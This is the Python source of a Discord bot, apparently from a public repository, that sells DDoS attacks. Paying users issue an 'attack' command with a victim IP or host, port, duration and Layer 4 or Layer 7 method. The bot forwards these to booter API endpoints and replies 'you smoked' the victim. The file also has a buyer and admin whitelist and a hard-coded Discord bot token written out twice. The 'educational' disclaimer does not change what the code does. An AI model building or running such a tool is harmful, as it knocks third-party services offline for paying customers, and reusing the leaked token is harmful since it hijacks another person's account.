# I may not be held responsible for any damage caused by my code. This project is purely made for 'Proof-Of-Concept', educational purposed,
# and stress-testing your own networks and IoT devices to test your DDoS protection. I do not tolerate any illegal use of my code,
# and the user is responsible for everything that he/she/they do with my code.
#
# This was created because a lot of script kiddies have been making poorly coded Discord DDoS bots, they used requests.get/post for Discord Bots, they used unclean code,
# they used poor grammar on the bots, and so on.
#
# With poor grammar, I refer to the people that say 'your' instead of 'you're', 'i' instead of 'I', 'dont' instead of 'don't', and so on.
# These little children should pay attention in school. Such grammar mistakes make you look more silly, and therefore you will archive less.
#
# This was made by XxBiancaXx#4356.
#
# LINKS:
# https://www.github.com/XxB1a/ddos-discord-bot
# https://www.instagram.com/moron420

from discord.ext import commands     # Commands
from discord.ext.commands import Bot # BOt
from os import system                # This will be used to clear the screen in on_ready()
from os import name                  # ^
from colorama import *               # This will be used to print our startup banner in color
import discord                       # D I S C O R D
import aiohttp                       # For our API Requests
import random                        # Random.randint(1,6) will be used in the random_color() function!

buyers  = [827030749119119360, 2, 3]              # Replace digits with Discord USER-IDs!
admins  = [827030749119119360, 2, 3]              # Replace digits with Discord USER-IDs! (admins!!)
owners  = [827030749119119360, 2, 3]              # Replace digits with Discord USER-IDs! (owners, they cannot be removed!!)
token   = 'ODM2MzMxMTU0NzQyODM3MjQ4.YIccFQ.Ksn23PcrkMz5ACThzfP1saXidLI'                  # Discord Bot token
bot     = commands.Bot(command_prefix='.')

l4methods = ['TCP Method', 'UDP Method', 'STD Method']             # Our Layer4 methods. Add more if desired!
l7methods = ['HTTP Method', 'CF BYPASS Method', 'HTTP-NUKER Method'] # Our Layer7 methods. Add more if desired!

# This is a list of dirs. We will use this for multiple API keys in the DDoS command.
api_data = [
    {
        'api_url':'https://www.yahoo.com', # API URL #1
        'api_key':'KEYYYYYY',              # API KEY #1
        'max_time':'1200'                  # The max booting time for our bot. You need to change it, probably.
    },
    {
        'api_url':'https://www.google.com', # API URL #1
        'api_key':'KEYYYYYY',               # API KEY #1
        'max_time':'300'                    # The max booting time for our bot. You need to change it, probably.
    }
]

# This is our function to give embeds a random color!
# You can call it using 'await random_color()'
async def random_color():
    number_lol = random.randint(1, 999999)

    while len(str(number_lol)) != 6:
        number_lol = int(str(f'{random.randint(1, 9)}{number_lol}'))

    return number_lol

@bot.command()
async def add_buyer(ctx, buyer : int = None):
    if ctx.author.id not in admins:
        await ctx.send(f'**Atom Launcher - {ctx.author}, you aren\'t an admin!**')

    elif buyer in buyers:
        await ctx.send(f'**{buyer} has already purchased Atom Shield.**')

    elif buyer is None:
        await ctx.send('**Atom Launcher - Please input a specified Atom Shield Membership Buyer.**')

    else:
        buyers.append(buyer)
        await ctx.send('**Atom Launcher: Succesfully added him/her to the whitelist application.**')

@bot.command()
async def del_buyer(ctx, buyer : int = None):
    if ctx.author.id not in admins:
        await ctx.send(f'**Atom Launcher: {ctx.author}, Don\'t attempt to use this if you are not an owner!**')

    elif buyer not in buyers:
        await ctx.send(f'**{buyer} has not purchased Atom Shield.**')

    elif buyer is None:
        await ctx.send('**Atom Launcher - Please input a specified Atom Shield Membership Buyer.**')

    else:
        buyers.remove(buyer)
        await ctx.send('**Atom Launcher - Successfully removed him/her from the whitelist application!**')
        
@bot.command()
async def add_admin(ctx, admin : int = None):
    if ctx.author.id not in owners:
        await ctx.send(f'**Atom Launcher: {ctx.author}, Don\'t attempt to use this if you are not an owner!**')

    elif admin in admins:
        await ctx.send(f'**{admin} is already a dedicated Atom Launcher administrator.**')

    elif admin is None:
        await ctx.send('**Atom Launcher: Please mention or specify a specific administrator.**')

    else:
        admins.append(admin)
        await ctx.send('Atom Launcher: Successfully added him/her to the whitelist application.')

@bot.command()
async def del_admin(ctx, admin : int = None):
    if ctx.author.id not in owners:
        await ctx.send(f'**Atom Launcher - {ctx.author},  you aren\'t an owner!**')

    elif admin not in admins:
        await ctx.send(f'**{admin} is not an admin**')

    elif admin is None:
        await ctx.send('**Atom Launcher: Please mention or specify a specific administrator.**')

    else:
        admins.remove(admin)
        await ctx.send('**Atom Launcher: Successfully removed him/her from the whitelist application.**')

#ctx, method/help, victim (ip/host), port (exmpl 80), time
@bot.command()
async def attack(ctx, method : str = None, victim : str = None, port : str = None, time : str = None):
    if ctx.author.id not in buyers: # They didn't buy the bot!!
        await ctx.send('**Atom Launcher: You must purchase Atom Shield before attempting to use commands.**')

    else:
        if method is None or method.upper() == 'HELP':
            l4methodstr = ''
            l7methodstr = ''

            for m in l4methods:
                l4methodstr = f'{l4methodstr}{m}\n'

            for m2 in l7methods:
                l7methodstr = f'{l7methodstr}{m2}\n'

            embed = discord.Embed(title="Atom Shield - Dashboard", description="You must input the format displayed below.", color=await random_color())
            embed.add_field(name="Atom Detection:", value=".ddos <your-method> | <your-target> | <your-port> | <your-time>")
            embed.add_field(name="Atom Shield - L4 Methods:", value=f"{l4methodstr}")
            embed.add_field(name="Atom Shield - L7 Methods:", value=f"{l7methodstr}")

            await ctx.send(embed=embed)

        # There was no method
        elif method is None:
            await ctx.send('**Please enter a specified method!**')
            
        # The method was invalid!
        elif method.upper() not in l4methods and method.upper() not in l7methods:
            await ctx.send(f'**Atom Launcher - You have entered an invalid method use.**')

        # There was no victim
        elif victim is None:
            await ctx.send('**Atom Launcher - You must select/choose a given target!**')

        # There was no port
        elif port is None:
            await ctx.send('**Atom Launcher - You must enter a working Port Number!**')

        # There was no time
        elif time is None:
            await ctx.send('**Atom Launcher - You must enter a certain amount of time for the attack!**')

        # Everything is correct!
        else:
            for i in api_data:
                try:
                    api_url = i["api_url"]
                    api_key = i["api_key"]
                    max_time = int(i["max_time"])

                    if int(time) > max_time:
                        time2 = max_time

                    else:
                        time2 = int(time)

                    async with aiohttp.ClientSession() as session:
                        await session.post(f'{api_url}/?key={api_key}&ip={victim}&port={port}&time={time2}&method={method.upper()}')
                        #print(f'{api_url}/?key={api_key}&ip={victim}&port={port}&time={time2}&method={method.upper()}')

                except Exception as e:
                    #print(e)
                    pass

            embed = discord.Embed(title="Smoked!", description=f"UwU, you smoked {victim}", color=await random_color())
            await ctx.send(embed=embed)

@bot.event
async def on_ready():
    banner = f"""
        {Fore.RED};) ██╗  █{Fore.YELLOW}█╗███████{Fore.GREEN}╗███╗   █{Fore.CYAN}█╗███████{Fore.BLUE}█╗ █████╗{Fore.MAGENTA} ██╗ :-).
        {Fore.RED};) ██║  █{Fore.YELLOW}█║██╔════{Fore.GREEN}╝████╗  █{Fore.CYAN}█║╚══██╔═{Fore.BLUE}═╝██╔══██{Fore.MAGENTA}╗██║ :-).
        {Fore.RED};) ██████{Fore.YELLOW}█║█████╗ {Fore.GREEN} ██╔██╗ █{Fore.CYAN}█║   ██║ {Fore.BLUE}  ███████{Fore.MAGENTA}║██║ :-).
        {Fore.RED};) ██╔══█{Fore.YELLOW}█║██╔══╝ {Fore.GREEN} ██║╚██╗█{Fore.CYAN}█║   ██║ {Fore.BLUE}  ██╔══██{Fore.MAGENTA}║██║ :-).
        {Fore.RED};) ██║  █{Fore.YELLOW}█║███████{Fore.GREEN}╗██║ ╚███{Fore.CYAN}█║   ██║ {Fore.BLUE}  ██║  ██{Fore.MAGENTA} ██║ :-).
        {Fore.RED};) ╚═╝  ╚{Fore.YELLOW}═╝╚══════{Fore.GREEN}╝╚═╝  ╚══{Fore.CYAN}═╝   ╚═╝ {Fore.BLUE}  ╚═╝  ╚═{Fore.MAGENTA}╝╚═╝ :-).
        {Fore.RESET}"""

    if name == 'nt':
        system('cls')

    else:
        system('clear')

    print(banner)
    print(f'{Fore.RED}           Logged in on {Fore.YELLOW}{bot.user.name}{Fore.GREEN}! My ID is {Fore.BLUE}{bot.user.id}{Fore.MAGENTA}, I believe!{Fore.RESET}\n')
    
    if str(len(bot.guilds)) == 1:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} server!"))
        
    else:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} DDoS Attacks"))

if __name__ == '__main__':
    init(convert=True)
    bot.run("ODM2MzMxMTU0NzQyODM3MjQ4.YIccFQ.Ksn23PcrkMz5ACThzfP1saXidLI")
